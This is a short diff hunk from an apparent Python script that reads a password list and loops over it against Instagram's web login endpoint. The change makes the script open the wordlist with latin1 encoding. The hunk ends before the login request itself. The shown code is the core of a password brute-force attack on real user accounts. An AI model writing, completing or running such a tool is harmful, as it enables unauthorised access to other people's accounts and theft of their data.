@@ -80,7 +80,7 @@ headers = {
 
 
 def main():
-        with open(passwords, 'r') as file:
+        with open(passwords, 'r', encoding='latin1') as file:
             passwordss = file.read().splitlines()
             for password in passwordss :
                 loginurl = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
